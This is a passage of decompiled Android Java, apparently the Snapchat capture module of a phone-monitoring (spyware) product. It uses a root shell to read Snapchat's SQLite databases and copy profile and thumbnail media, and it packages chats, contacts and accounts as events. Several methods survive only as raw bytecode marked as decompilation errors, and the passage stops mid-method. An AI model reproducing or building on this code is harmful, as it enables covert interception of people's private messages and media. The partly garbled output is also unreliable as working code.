package com.vvt.capture.snapchat;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.media.MediaMetadataRetriever;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxIMAccountEvent;
import com.vvt.events.FxIMContactEvent;
import com.vvt.events.FxIMConversationEvent;
import com.vvt.events.FxIMMessageEvent;
import com.vvt.events.FxIMMessageServiceType;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.im.events.MessageType;
import com.vvt.io.p;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

public class b
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static String c;
  private static String d;
  
  public static long a(String paramString, boolean paramBoolean)
  {
    boolean bool1 = a;
    if ((!bool1) || (paramBoolean)) {}
    for (long l = e(paramString);; l = f(paramString))
    {
      boolean bool2 = a;
      if (bool2) {}
      return l;
    }
  }
  
  public static long a(boolean paramBoolean)
  {
    boolean bool1 = a;
    if ((!bool1) || (paramBoolean)) {}
    for (long l = f();; l = f(null))
    {
      boolean bool2 = a;
      if (bool2) {}
      return l;
      bool1 = false;
    }
  }
  
  /* Error */
  private static com.vvt.im.events.info.d a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2, String paramString3, String paramString4, String paramString5)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 6
    //   3: aload_2
    //   4: aload 4
    //   6: invokestatic 32	com/vvt/capture/snapchat/removeFromPath:removeFromPath	(Ljava/lang/String;Ljava/lang/String;)V
    //   9: new 34	com/vvt/im/events/info/d
    //   12: astore 7
    //   14: aload 7
    //   16: invokespecial 38	com/vvt/im/events/info/d:<init>	()V
    //   19: invokestatic 41	com/vvt/capture/snapchat/removeFromPath:MyUncaughtExceptionHandler	()Ljava/lang/String;
    //   22: astore 8
    //   24: iconst_1
    //   25: istore 9
    //   27: iload 9
    //   29: anewarray 44	java/lang/String
    //   32: astore 10
    //   34: getstatic 46	com/vvt/capture/snapchat/removeFromPath:d	Ljava/lang/String;
    //   37: astore 11
    //   39: aload 10
    //   41: iconst_0
    //   42: aload 11
    //   44: aastore
    //   45: aload_0
    //   46: aload 8
    //   48: aload 10
    //   50: invokevirtual 52	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   53: astore 8
    //   55: aload 8
    //   57: ifnull +43 -> 100
    //   60: aload 8
    //   62: invokeinterface 58 1 0
    //   67: istore 9
    //   69: iload 9
    //   71: ifeq +29 -> 100
    //   74: ldc 60
    //   76: astore 10
    //   78: aload 8
    //   80: aload 10
    //   82: invokeinterface 64 2 0
    //   87: istore 9
    //   89: aload 8
    //   91: iload 9
    //   93: invokeinterface 68 2 0
    //   98: astore 6
    //   100: aload 8
    //   102: ifnull +10 -> 112
    //   105: aload 8
    //   107: invokeinterface 71 1 0
    //   112: aload_0
    //   113: aload_1
    //   114: aload_3
    //   115: aload 5
    //   117: aload 4
    //   119: invokestatic 74	com/vvt/capture/snapchat/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   122: astore 8
    //   124: aload 6
    //   126: invokestatic 79	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   129: istore 9
    //   131: iload 9
    //   133: ifeq +8 -> 141
    //   136: getstatic 46	com/vvt/capture/snapchat/removeFromPath:d	Ljava/lang/String;
    //   139: astore 6
    //   141: aload 7
    //   143: aload 6
    //   145: invokevirtual 82	com/vvt/im/events/info/d:a	(Ljava/lang/String;)V
    //   148: getstatic 46	com/vvt/capture/snapchat/removeFromPath:d	Ljava/lang/String;
    //   151: astore 6
    //   153: aload 7
    //   155: aload 6
    //   157: invokevirtual 84	com/vvt/im/events/info/d:removeFromPath	(Ljava/lang/String;)V
    //   160: aload 7
    //   162: aload 8
    //   164: invokevirtual 86	com/vvt/im/events/info/d:f	(Ljava/lang/String;)V
    //   167: aload 7
    //   169: areturn
    //   170: astore 8
    //   172: aconst_null
    //   173: astore 8
    //   175: getstatic 20	com/vvt/capture/snapchat/removeFromPath:removeFromPath	Z
    //   178: istore 9
    //   180: iload 9
    //   182: ifeq +3 -> 185
    //   185: aload 8
    //   187: ifnull -75 -> 112
    //   190: goto -85 -> 105
    //   193: astore 12
    //   195: aconst_null
    //   196: astore 8
    //   198: aload 12
    //   200: astore 6
    //   202: aload 8
    //   204: ifnull +10 -> 214
    //   207: aload 8
    //   209: invokeinterface 71 1 0
    //   214: aload 6
    //   216: athrow
    //   217: astore 6
    //   219: goto -17 -> 202
    //   222: astore 10
    //   224: goto -49 -> 175
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	227	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	227	1	paramString1	String
    //   0	227	2	paramString2	String
    //   0	227	3	paramString3	String
    //   0	227	4	paramString4	String
    //   0	227	5	paramString5	String
    //   1	214	6	localObject1	Object
    //   217	1	6	localObject2	Object
    //   12	156	7	locald	com.vvt.im.events.info.d
    //   22	141	8	localObject3	Object
    //   170	1	8	localException1	Exception
    //   173	35	8	localObject4	Object
    //   25	45	9	bool1	boolean
    //   87	5	9	i	int
    //   129	52	9	bool2	boolean
    //   32	49	10	localObject5	Object
    //   222	1	10	localException2	Exception
    //   37	6	11	str	String
    //   193	6	12	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   19	22	170	java/lang/Exception
    //   27	32	170	java/lang/Exception
    //   34	37	170	java/lang/Exception
    //   42	45	170	java/lang/Exception
    //   48	53	170	java/lang/Exception
    //   19	22	193	finally
    //   27	32	193	finally
    //   34	37	193	finally
    //   42	45	193	finally
    //   48	53	193	finally
    //   60	67	217	finally
    //   80	87	217	finally
    //   91	98	217	finally
    //   175	178	217	finally
    //   60	67	222	java/lang/Exception
    //   80	87	222	java/lang/Exception
    //   91	98	222	java/lang/Exception
  }
  
  /* Error */
  private static String a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2, String paramString3, String paramString4)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 5
    //   3: aconst_null
    //   4: astore 6
    //   6: getstatic 15	com/vvt/capture/snapchat/removeFromPath:a	Z
    //   9: istore 7
    //   11: iload 7
    //   13: ifeq +3 -> 16
    //   16: invokestatic 90	com/vvt/capture/snapchat/removeFromPath:d	()Ljava/lang/String;
    //   19: astore 8
    //   21: iconst_1
    //   22: istore 9
    //   24: iload 9
    //   26: anewarray 44	java/lang/String
    //   29: astore 10
    //   31: iconst_0
    //   32: istore 11
    //   34: aconst_null
    //   35: astore 12
    //   37: ldc 92
    //   39: astore 13
    //   41: aload 10
    //   43: iconst_0
    //   44: aload 13
    //   46: aastore
    //   47: aload_0
    //   48: aload 8
    //   50: aload 10
    //   52: invokevirtual 52	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   55: astore 10
    //   57: aload 10
    //   59: ifnull +463 -> 522
    //   62: aload 10
    //   64: invokeinterface 58 1 0
    //   69: istore 7
    //   71: iload 7
    //   73: ifeq +449 -> 522
    //   76: ldc 94
    //   78: astore 8
    //   80: aload 10
    //   82: aload 8
    //   84: invokeinterface 64 2 0
    //   89: istore 7
    //   91: aload 10
    //   93: iload 7
    //   95: invokeinterface 68 2 0
    //   100: astore 8
    //   102: aload 10
    //   104: ifnull +10 -> 114
    //   107: aload 10
    //   109: invokeinterface 71 1 0
    //   114: getstatic 100	com/vvt/im/events/ImType:SNAPCHAT	Lcom/vvt/im/events/ImType;
    //   117: astore 10
    //   119: getstatic 106	com/vvt/im/events/ImMediaFileType:OWNER_PROFILE	Lcom/vvt/im/events/ImMediaFileType;
    //   122: astore 12
    //   124: aload_1
    //   125: aload 10
    //   127: aload 12
    //   129: invokestatic 111	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/ImType;Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   132: astore 10
    //   134: getstatic 106	com/vvt/im/events/ImMediaFileType:OWNER_PROFILE	Lcom/vvt/im/events/ImMediaFileType;
    //   137: invokestatic 114	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   140: astore 12
    //   142: aload 8
    //   144: invokestatic 79	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   147: istore 14
    //   149: iload 14
    //   151: ifne +291 -> 442
    //   154: aload 8
    //   156: invokestatic 118	com/vvt/shell/ShellUtil:removeFromPath	(Ljava/lang/String;)Z
    //   159: istore 14
    //   161: iload 14
    //   163: ifeq +279 -> 442
    //   166: new 120	java/lang/StringBuilder
    //   169: astore 13
    //   171: aload 13
    //   173: invokespecial 121	java/lang/StringBuilder:<init>	()V
    //   176: aload 13
    //   178: aload 10
    //   180: invokevirtual 125	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   183: astore 10
    //   185: getstatic 130	java/io/File:separator	Ljava/lang/String;
    //   188: astore 13
    //   190: aload 10
    //   192: aload 13
    //   194: invokevirtual 125	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   197: astore 10
    //   199: aload 10
    //   201: aload 12
    //   203: invokevirtual 125	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   206: astore 10
    //   208: aload 10
    //   210: invokevirtual 133	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   213: astore 6
    //   215: ldc -121
    //   217: astore 10
    //   219: bipush 7
    //   221: istore 11
    //   223: iload 11
    //   225: anewarray 4	java/lang/Object
    //   228: astore 12
    //   230: iconst_0
    //   231: istore 14
    //   233: aconst_null
    //   234: astore 13
    //   236: aload_1
    //   237: invokestatic 141	com/vvt/capture/snapchat/d:d	(Ljava/lang/String;)Ljava/lang/String;
    //   240: astore 15
    //   242: aload 12
    //   244: iconst_0
    //   245: aload 15
    //   247: aastore
    //   248: iconst_1
    //   249: istore 14
    //   251: aload 12
    //   253: iload 14
    //   255: aload 8
    //   257: aastore
    //   258: iconst_2
    //   259: istore 7
    //   261: aload 12
    //   263: iload 7
    //   265: aload 6
    //   267: aastore
    //   268: iconst_3
    //   269: istore 7
    //   271: aload 12
    //   273: iload 7
    //   275: aload 6
    //   277: aastore
    //   278: iconst_4
    //   279: istore 7
    //   281: aload 12
    //   283: iload 7
    //   285: aload_2
    //   286: aastore
    //   287: iconst_5
    //   288: istore 7
    //   290: aload 12
    //   292: iload 7
    //   294: aload_2
    //   295: aastore
    //   296: bipush 6
    //   298: istore 7
    //   300: aload 12
    //   302: iload 7
    //   304: aload 6
    //   306: aastore
    //   307: aload 10
    //   309: aload 12
    //   311: invokestatic 150	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   314: astore 8
    //   316: aload 8
    //   318: invokestatic 154	com/vvt/shell/KMShell:a	(Ljava/lang/String;)Ljava/lang/String;
    //   321: pop
    //   322: invokestatic 158	com/vvt/aa/a:MyUncaughtExceptionHandler	()Z
    //   325: istore 7
    //   327: iload 7
    //   329: ifeq +9 -> 338
    //   332: aload_3
    //   333: aload 6
    //   335: invokestatic 160	com/vvt/shell/ShellUtil:MyUncaughtExceptionHandler	(Ljava/lang/String;Ljava/lang/String;)V
    //   338: getstatic 15	com/vvt/capture/snapchat/removeFromPath:a	Z
    //   341: istore 7
    //   343: iload 7
    //   345: ifeq +3 -> 348
    //   348: aload 6
    //   350: astore 8
    //   352: getstatic 15	com/vvt/capture/snapchat/removeFromPath:a	Z
    //   355: istore 5
    //   357: iload 5
    //   359: ifeq +3 -> 362
    //   362: aload 8
    //   364: areturn
    //   365: astore 8
    //   367: iconst_0
    //   368: istore 7
    //   370: aconst_null
    //   371: astore 8
    //   373: getstatic 20	com/vvt/capture/snapchat/removeFromPath:removeFromPath	Z
    //   376: istore 9
    //   378: iload 9
    //   380: ifeq +3 -> 383
    //   383: aload 8
    //   385: ifnull +10 -> 395
    //   388: aload 8
    //   390: invokeinterface 71 1 0
    //   395: iconst_0
    //   396: istore 7
    //   398: aconst_null
    //   399: astore 8
    //   401: goto -287 -> 114
    //   404: astore 8
    //   406: aload 6
    //   408: ifnull +10 -> 418
    //   411: aload 6
    //   413: invokeinterface 71 1 0
    //   418: aload 8
    //   420: athrow
    //   421: astore 8
    //   423: iconst_0
    //   424: istore 7
    //   426: aconst_null
    //   427: astore 8
    //   429: getstatic 20	com/vvt/capture/snapchat/removeFromPath:removeFromPath	Z
    //   432: istore 5
    //   434: iload 5
    //   436: ifeq -84 -> 352
    //   439: goto -87 -> 352
    //   442: getstatic 46	com/vvt/capture/snapchat/removeFromPath:d	Ljava/lang/String;
    //   445: astore 13
    //   447: getstatic 106	com/vvt/im/events/ImMediaFileType:OWNER_PROFILE	Lcom/vvt/im/events/ImMediaFileType;
    //   450: astore 15
    //   452: aload_1
    //   453: astore 8
    //   455: aload_2
    //   456: astore 6
    //   458: aload_3
    //   459: astore 10
    //   461: aload 4
    //   463: astore 12
    //   465: aload_1
    //   466: aload_2
    //   467: aload_3
    //   468: aload 4
    //   470: aload 13
    //   472: aload 15
    //   474: invokestatic 163	com/vvt/capture/snapchat/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   477: astore 8
    //   479: goto -127 -> 352
    //   482: astore 8
    //   484: aload 6
    //   486: astore 8
    //   488: goto -59 -> 429
    //   491: astore 8
    //   493: aload 10
    //   495: astore 6
    //   497: goto -91 -> 406
    //   500: astore 16
    //   502: aload 8
    //   504: astore 6
    //   506: aload 16
    //   508: astore 8
    //   510: goto -104 -> 406
    //   513: astore 8
    //   515: aload 10
    //   517: astore 8
    //   519: goto -146 -> 373
    //   522: iconst_0
    //   523: istore 7
    //   525: aconst_null
    //   526: astore 8
    //   528: goto -426 -> 102
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	531	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	531	1	paramString1	String
    //   0	531	2	paramString2	String
    //   0	531	3	paramString3	String
    //   0	531	4	paramString4	String
    //   1	434	5	bool1	boolean
    //   4	501	6	localObject1	Object
    //   9	63	7	bool2	boolean
    //   89	214	7	i	int
    //   325	199	7	bool3	boolean
    //   19	344	8	localObject2	Object
    //   365	1	8	localException1	Exception
    //   371	29	8	localObject3	Object
    //   404	15	8	localObject4	Object
    //   421	1	8	localShellException1	KMShell.ShellException
    //   427	51	8	str	String
    //   482	1	8	localShellException2	KMShell.ShellException
    //   486	1	8	localObject5	Object
    //   491	12	8	localObject6	Object
    //   508	1	8	localObject7	Object
    //   513	1	8	localException2	Exception
    //   517	10	8	localObject8	Object
    //   22	357	9	bool4	boolean
    //   29	487	10	localObject9	Object
    //   32	192	11	j	int
    //   35	429	12	localObject10	Object
    //   39	432	13	localObject11	Object
    //   147	107	14	bool5	boolean
    //   240	233	15	localObject12	Object
    //   500	7	16	localObject13	Object
    // Exception table:
    //   from	to	target	type
    //   16	19	365	java/lang/Exception
    //   24	29	365	java/lang/Exception
    //   44	47	365	java/lang/Exception
    //   50	55	365	java/lang/Exception
    //   16	19	404	finally
    //   24	29	404	finally
    //   44	47	404	finally
    //   50	55	404	finally
    //   166	169	421	com/vvt/shell/KMShell$ShellException
    //   171	176	421	com/vvt/shell/KMShell$ShellException
    //   178	183	421	com/vvt/shell/KMShell$ShellException
    //   185	188	421	com/vvt/shell/KMShell$ShellException
    //   192	197	421	com/vvt/shell/KMShell$ShellException
    //   201	206	421	com/vvt/shell/KMShell$ShellException
    //   208	213	421	com/vvt/shell/KMShell$ShellException
    //   223	228	482	com/vvt/shell/KMShell$ShellException
    //   236	240	482	com/vvt/shell/KMShell$ShellException
    //   245	248	482	com/vvt/shell/KMShell$ShellException
    //   255	258	482	com/vvt/shell/KMShell$ShellException
    //   265	268	482	com/vvt/shell/KMShell$ShellException
    //   275	278	482	com/vvt/shell/KMShell$ShellException
    //   285	287	482	com/vvt/shell/KMShell$ShellException
    //   294	296	482	com/vvt/shell/KMShell$ShellException
    //   304	307	482	com/vvt/shell/KMShell$ShellException
    //   309	314	482	com/vvt/shell/KMShell$ShellException
    //   316	322	482	com/vvt/shell/KMShell$ShellException
    //   322	325	482	com/vvt/shell/KMShell$ShellException
    //   333	338	482	com/vvt/shell/KMShell$ShellException
    //   338	341	482	com/vvt/shell/KMShell$ShellException
    //   62	69	491	finally
    //   82	89	491	finally
    //   93	100	491	finally
    //   373	376	500	finally
    //   62	69	513	java/lang/Exception
    //   82	89	513	java/lang/Exception
    //   93	100	513	java/lang/Exception
  }
  
  public static String a(String paramString)
  {
    String str = c;
    if (str == null) {
      g(paramString);
    }
    return c;
  }
  
  public static String a(String paramString, int paramInt)
  {
    Object localObject1 = ImType.SNAPCHAT;
    Object localObject2 = com.vvt.im.a.c.a(paramString, (ImType)localObject1);
    localObject1 = "image";
    int i = 1;
    if (paramInt == i) {
      localObject1 = "video";
    }
    localObject1 = p.a((String)localObject2, (String)localObject1);
    localObject2 = new java/io/File;
    ((File)localObject2).<init>((String)localObject1);
    boolean bool = ((File)localObject2).exists();
    if (!bool) {
      ((File)localObject2).mkdirs();
    }
    return (String)localObject1;
  }
  
  /* Error */
  private static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 4
    //   3: ldc -64
    //   5: astore 5
    //   7: invokestatic 197	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   10: astore 6
    //   12: aload 6
    //   14: ifnull +345 -> 359
    //   17: getstatic 100	com/vvt/im/events/ImType:SNAPCHAT	Lcom/vvt/im/events/ImType;
    //   20: astore 7
    //   22: getstatic 200	com/vvt/im/events/ImMediaFileType:THUMBMAIL	Lcom/vvt/im/events/ImMediaFileType;
    //   25: astore 8
    //   27: aload_1
    //   28: aload 7
    //   30: aload 8
    //   32: invokestatic 111	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/ImType;Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   35: astore 7
    //   37: getstatic 200	com/vvt/im/events/ImMediaFileType:THUMBMAIL	Lcom/vvt/im/events/ImMediaFileType;
    //   40: astore 8
    //   42: aload 8
    //   44: invokestatic 114	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   47: astore 8
    //   49: new 120	java/lang/StringBuilder
    //   52: astore 9
    //   54: aload 9
    //   56: invokespecial 121	java/lang/StringBuilder:<init>	()V
    //   59: aload 9
    //   61: aload 7
    //   63: invokevirtual 125	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   66: astore 7
    //   68: getstatic 130	java/io/File:separator	Ljava/lang/String;
    //   71: astore 9
    //   73: aload 7
    //   75: aload 9
    //   77: invokevirtual 125	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   80: astore 7
    //   82: aload 7
    //   84: aload 8
    //   86: invokevirtual 125	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   89: astore 7
    //   91: aload 7
    //   93: aload 5
    //   95: invokevirtual 125	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   98: astore 5
    //   100: aload 5
    //   102: invokevirtual 133	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   105: astore 5
    //   107: ldc -54
    //   109: astore 7
    //   111: aload_1
    //   112: aload 7
    //   114: invokestatic 182	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   117: astore 7
    //   119: ldc -52
    //   121: astore 8
    //   123: iconst_1
    //   124: istore 10
    //   126: iload 10
    //   128: anewarray 4	java/lang/Object
    //   131: astore 9
    //   133: aload 9
    //   135: iconst_0
    //   136: aload 7
    //   138: aastore
    //   139: aload 8
    //   141: aload 9
    //   143: invokestatic 150	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   146: astore 8
    //   148: aload 6
    //   150: aload 8
    //   152: invokevirtual 205	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   155: pop
    //   156: ldc -49
    //   158: astore 8
    //   160: iconst_3
    //   161: istore 10
    //   163: iload 10
    //   165: anewarray 4	java/lang/Object
    //   168: astore 9
    //   170: aload 9
    //   172: iconst_0
    //   173: aload 7
    //   175: aastore
    //   176: iconst_1
    //   177: istore 11
    //   179: aload 9
    //   181: iload 11
    //   183: aload_0
    //   184: aastore
    //   185: iconst_2
    //   186: istore 11
    //   188: aload 9
    //   190: iload 11
    //   192: aload 5
    //   194: aastore
    //   195: aload 8
    //   197: aload 9
    //   199: invokestatic 150	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   202: astore 7
    //   204: getstatic 15	com/vvt/capture/snapchat/removeFromPath:a	Z
    //   207: istore 12
    //   209: iload 12
    //   211: ifeq +3 -> 214
    //   214: aload 6
    //   216: aload 7
    //   218: invokevirtual 205	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   221: pop
    //   222: getstatic 15	com/vvt/capture/snapchat/removeFromPath:a	Z
    //   225: istore 11
    //   227: iload 11
    //   229: ifeq +3 -> 232
    //   232: ldc -47
    //   234: astore 7
    //   236: iconst_3
    //   237: istore 12
    //   239: iload 12
    //   241: anewarray 4	java/lang/Object
    //   244: astore 8
    //   246: iconst_0
    //   247: istore 10
    //   249: aconst_null
    //   250: astore 9
    //   252: aload 8
    //   254: iconst_0
    //   255: aload_2
    //   256: aastore
    //   257: iconst_1
    //   258: istore 10
    //   260: aload 8
    //   262: iload 10
    //   264: aload_2
    //   265: aastore
    //   266: iconst_2
    //   267: istore 10
    //   269: aload 8
    //   271: iload 10
    //   273: aload 5
    //   275: aastore
    //   276: aload 7
    //   278: aload 8
    //   280: invokestatic 150	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   283: astore 7
    //   285: aload 6
    //   287: aload 7
    //   289: invokevirtual 205	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   292: pop
    //   293: invokestatic 158	com/vvt/aa/a:MyUncaughtExceptionHandler	()Z
    //   296: istore 11
    //   298: iload 11
    //   300: ifeq +55 -> 355
    //   303: ldc -45
    //   305: astore 7
    //   307: iconst_2
    //   308: istore 12
    //   310: iload 12
    //   312: anewarray 4	java/lang/Object
    //   315: astore 8
    //   317: iconst_0
    //   318: istore 10
    //   320: aconst_null
    //   321: astore 9
    //   323: aload 8
    //   325: iconst_0
    //   326: aload_3
    //   327: aastore
    //   328: iconst_1
    //   329: istore 10
    //   331: aload 8
    //   333: iload 10
    //   335: aload 5
    //   337: aastore
    //   338: aload 7
    //   340: aload 8
    //   342: invokestatic 150	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   345: astore 7
    //   347: aload 6
    //   349: aload 7
    //   351: invokevirtual 205	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   354: pop
    //   355: aload 5
    //   357: astore 4
    //   359: aload 6
    //   361: ifnull +8 -> 369
    //   364: aload 6
    //   366: invokevirtual 213	com/vvt/shell/f:d	()V
    //   369: getstatic 15	com/vvt/capture/snapchat/removeFromPath:a	Z
    //   372: istore 13
    //   374: iload 13
    //   376: ifeq +3 -> 379
    //   379: aload 4
    //   381: areturn
    //   382: astore 6
    //   384: iconst_0
    //   385: istore 13
    //   387: aconst_null
    //   388: astore 6
    //   390: getstatic 20	com/vvt/capture/snapchat/removeFromPath:removeFromPath	Z
    //   393: istore 14
    //   395: iload 14
    //   397: ifeq +3 -> 400
    //   400: aload 6
    //   402: ifnull -33 -> 369
    //   405: goto -41 -> 364
    //   408: astore 15
    //   410: iconst_0
    //   411: istore 13
    //   413: aconst_null
    //   414: astore 6
    //   416: aload 15
    //   418: astore 4
    //   420: aload 6
    //   422: ifnull +8 -> 430
    //   425: aload 6
    //   427: invokevirtual 213	com/vvt/shell/f:d	()V
    //   430: aload 4
    //   432: athrow
    //   433: astore 4
    //   435: goto -15 -> 420
    //   438: astore 5
    //   440: goto -50 -> 390
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	443	0	paramString1	String
    //   0	443	1	paramString2	String
    //   0	443	2	paramString3	String
    //   0	443	3	paramString4	String
    //   1	430	4	localObject1	Object
    //   433	1	4	localObject2	Object
    //   5	351	5	localObject3	Object
    //   438	1	5	localCannotGetRootShellException1	CannotGetRootShellException
    //   10	355	6	localf	com.vvt.shell.f
    //   382	1	6	localCannotGetRootShellException2	CannotGetRootShellException
    //   388	38	6	localObject4	Object
    //   20	330	7	localObject5	Object
    //   25	316	8	localObject6	Object
    //   52	270	9	localObject7	Object
    //   124	210	10	i	int
    //   177	14	11	j	int
    //   225	74	11	bool1	boolean
    //   207	3	12	bool2	boolean
    //   237	74	12	k	int
    //   372	40	13	bool3	boolean
    //   393	3	14	bool4	boolean
    //   408	9	15	localObject8	Object
    // Exception table:
    //   from	to	target	type
    //   7	10	382	com/vvt/shell/CannotGetRootShellException
    //   7	10	408	finally
    //   17	20	433	finally
    //   22	25	433	finally
    //   30	35	433	finally
    //   37	40	433	finally
    //   42	47	433	finally
    //   49	52	433	finally
    //   54	59	433	finally
    //   61	66	433	finally
    //   68	71	433	finally
    //   75	80	433	finally
    //   84	89	433	finally
    //   93	98	433	finally
    //   100	105	433	finally
    //   112	117	433	finally
    //   126	131	433	finally
    //   136	139	433	finally
    //   141	146	433	finally
    //   150	156	433	finally
    //   163	168	433	finally
    //   173	176	433	finally
    //   183	185	433	finally
    //   192	195	433	finally
    //   197	202	433	finally
    //   204	207	433	finally
    //   216	222	433	finally
    //   222	225	433	finally
    //   239	244	433	finally
    //   255	257	433	finally
    //   264	266	433	finally
    //   273	276	433	finally
    //   278	283	433	finally
    //   287	293	433	finally
    //   293	296	433	finally
    //   310	315	433	finally
    //   326	328	433	finally
    //   335	338	433	finally
    //   340	345	433	finally
    //   349	355	433	finally
    //   390	393	433	finally
    //   17	20	438	com/vvt/shell/CannotGetRootShellException
    //   22	25	438	com/vvt/shell/CannotGetRootShellException
    //   30	35	438	com/vvt/shell/CannotGetRootShellException
    //   37	40	438	com/vvt/shell/CannotGetRootShellException
    //   42	47	438	com/vvt/shell/CannotGetRootShellException
    //   49	52	438	com/vvt/shell/CannotGetRootShellException
    //   54	59	438	com/vvt/shell/CannotGetRootShellException
    //   61	66	438	com/vvt/shell/CannotGetRootShellException
    //   68	71	438	com/vvt/shell/CannotGetRootShellException
    //   75	80	438	com/vvt/shell/CannotGetRootShellException
    //   84	89	438	com/vvt/shell/CannotGetRootShellException
    //   93	98	438	com/vvt/shell/CannotGetRootShellException
    //   100	105	438	com/vvt/shell/CannotGetRootShellException
    //   112	117	438	com/vvt/shell/CannotGetRootShellException
    //   126	131	438	com/vvt/shell/CannotGetRootShellException
    //   136	139	438	com/vvt/shell/CannotGetRootShellException
    //   141	146	438	com/vvt/shell/CannotGetRootShellException
    //   150	156	438	com/vvt/shell/CannotGetRootShellException
    //   163	168	438	com/vvt/shell/CannotGetRootShellException
    //   173	176	438	com/vvt/shell/CannotGetRootShellException
    //   183	185	438	com/vvt/shell/CannotGetRootShellException
    //   192	195	438	com/vvt/shell/CannotGetRootShellException
    //   197	202	438	com/vvt/shell/CannotGetRootShellException
    //   204	207	438	com/vvt/shell/CannotGetRootShellException
    //   216	222	438	com/vvt/shell/CannotGetRootShellException
    //   222	225	438	com/vvt/shell/CannotGetRootShellException
    //   239	244	438	com/vvt/shell/CannotGetRootShellException
    //   255	257	438	com/vvt/shell/CannotGetRootShellException
    //   264	266	438	com/vvt/shell/CannotGetRootShellException
    //   273	276	438	com/vvt/shell/CannotGetRootShellException
    //   278	283	438	com/vvt/shell/CannotGetRootShellException
    //   287	293	438	com/vvt/shell/CannotGetRootShellException
    //   293	296	438	com/vvt/shell/CannotGetRootShellException
    //   310	315	438	com/vvt/shell/CannotGetRootShellException
    //   326	328	438	com/vvt/shell/CannotGetRootShellException
    //   335	338	438	com/vvt/shell/CannotGetRootShellException
    //   340	345	438	com/vvt/shell/CannotGetRootShellException
    //   349	355	438	com/vvt/shell/CannotGetRootShellException
  }
  
  private static String a(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5)
  {
    boolean bool1 = a;
    if (bool1) {}
    ImMediaFileType localImMediaFileType = ImMediaFileType.USER_PROFILE;
    String str = paramString1;
    str = a(paramString1, paramString2, paramString3, paramString4, paramString5, localImMediaFileType);
    boolean bool2 = a;
    if (bool2) {}
    return str;
  }
  
  private static String a(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, ImMediaFileType paramImMediaFileType)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    int i = 3;
    int j = 2;
    int k = 1;
    int m = 0;
    String str = null;
    boolean bool2 = a;
    if (bool2) {}
    Object localObject2 = b(paramString4);
    Object localObject3 = a(paramString4);
    localObject2 = d.a(paramString5, (String)localObject2, (String)localObject3);
    if (localObject2 != null)
    {
